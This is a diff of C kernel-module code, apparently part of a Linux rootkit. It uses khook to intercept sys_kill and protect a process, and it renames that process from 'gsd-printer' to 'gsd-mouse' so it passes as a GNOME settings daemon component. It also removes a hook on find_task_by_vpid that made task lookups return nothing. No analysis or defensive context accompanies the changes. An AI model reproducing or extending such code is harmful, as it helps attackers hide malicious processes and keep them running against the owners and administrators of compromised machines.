@@ -16,7 +16,7 @@
 
 #define FLAG 0x80000000
 
-const char *protected = "gsd-printer";
+const char *protected = "gsd-mouse";
 int protected_pid = -1;
 
 static int print_pid(void)
@@ -127,13 +127,6 @@ static long khook_sys_kill(pid_t pid, int sig) {
         //printk("sys_kill");
         //return KHOOK_ORIGIN(sys_kill, pid, sig);
 	return ret;
-}
-
-KHOOK(find_task_by_vpid);
-struct task_struct *khook_find_task_by_vpid(pid_t vnr)
-{
-	struct task_struct *tsk = NULL;
-	return tsk;
 }
 
 
